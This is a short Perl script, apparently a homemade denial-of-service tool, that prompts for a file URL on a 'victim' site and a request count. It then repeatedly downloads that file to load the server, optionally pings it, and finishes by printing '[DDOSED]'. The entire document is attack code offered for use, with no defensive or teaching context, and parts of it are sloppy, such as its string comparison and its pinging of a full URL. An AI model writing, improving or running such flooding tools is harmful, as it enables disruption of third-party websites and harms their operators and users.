#!/usr/bin/perl
# pejvak and mr root / the god
sleep(2);
system('clear');
sleep(1);
print('\033[20;37m\n');
system('date');
print ('\n');
sleep(4);
use LWP::Simple;
# simple library

$ARGC=@ARGV;
print("\033[35m[*] \033[36mplz insert file on the host victem example \033[31m[http://Qn2.Org/file.rar]\n");
print("\033[20;37maddress File => ");
$addressfile=(<stdin>);
chop ($addressfile);
print("\n\033[35m[*]\033[36m plz insert requast number example \033[31m[20]\n");
print("\033[20;37mnumber => ");
$timenumber=(<stdin>);
chop ($timenumber);
print("\n\033[35m[#] \033[36mstarted !\n");
$i=0;
while($i<$timenumber){
$i=$i+1;
getstore($addressfile,rand(10).".Qn2");
print("\n@");
}
print("\n\033[35m[*] \033[36mcheck ping site vistem\n");
print("\033[20;37mCHECK [yes|no] => ");
$yn=(<stdin>);
chop ($yn);
if($yn=="yes"){
system('ping '."$addressfile");
}
print("\n\033[92m===============================Done\n");
print("============================\n");
print("\n\n\033[35m[DDOSED]\n")
